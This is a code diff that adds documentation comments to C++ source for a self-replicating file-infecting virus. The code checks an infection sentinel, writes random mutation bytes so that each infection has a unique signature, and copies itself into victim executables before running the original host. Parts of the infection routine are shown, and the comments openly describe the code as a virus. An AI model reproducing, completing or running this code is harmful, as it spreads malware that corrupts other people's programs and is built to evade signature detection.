@@ -10,11 +10,23 @@
 // Size of the random mutation block (adjust as needed)
 const size_t MUTATION_SIZE = 16;
 
+/**
+ * @brief Executes the host program.
+ *
+ * This function calls the `execv` system function to replace the current
+ * process image with the executable for the host program (`./host`).
+ */
 void execute_host() {
     char* const args[] = { const_cast<char*>("./host"), nullptr };
     execv("./host", args);  // Execute the host binary
 }
 
+/**
+ * @brief Checks if a file is infected.
+ *
+ * @param filename The name of the file to check.
+ * @return true if the file contains the infection sentinel (0xdeadbeef), false otherwise.
+ */
 bool is_infected(const char* filename) {
     std::ifstream file(filename, std::ios::binary);
     if (!file) return false;
@@ -25,6 +37,14 @@ bool is_infected(const char* filename) {
     return sentinel == 0xdeadbeef;
 }
 
+/**
+ * @brief Adds a mutation block to the infected file.
+ *
+ * @param infected_file An output file stream for writing the mutated block.
+ *
+ * This function writes a randomly generated block of bytes to the file, creating a unique signature
+ * for each infection.
+ */
 void mutate_virus(std::ofstream& infected_file) {
     // Initialize random seed based on current time
     std::srand(std::time(nullptr));
@@ -39,6 +59,15 @@ void mutate_virus(std::ofstream& infected_file) {
     infected_file.write(mutation_block, MUTATION_SIZE);
 }
 
+/**
+ * @brief Infects a victim file with the virus.
+ *
+ * @param victim_name The name of the victim file to infect.
+ * @param self_name The name of the current executable (virus) file.
+ *
+ * This function checks if the victim file is already infected. If not, it creates an infected version
+ * by copying the virus code, applying a mutation, appending the original victim content, and adding a sentinel.
+ */
 void infect(const char* victim_name, const char* self_name) {
     if (is_infected(victim_name)) {
         return;  // Victim already infected
@@ -79,6 +108,16 @@ void infect(const char* victim_name, const char* self_name) {
     chmod(victim_name, S_IRWXU | S_IRGRP | S_IROTH);  // Make the file executable
 }
 
+/**
+ * @brief Main entry point of the virus program.
+ *
+ * @param argc Argument count.
+ * @param argv Argument vector containing command-line arguments.
+ * @return 0 on successful execution, 1 if an error occurs.
+ *
+ * This function attempts to infect a victim file specified on the command line,
+ * then executes the host program.
+ */
 int main(int argc, char* argv[]) {
     if (argc < 2) {
         std::cerr << "Usage: " << argv[0] << " <victim>" << std::endl;
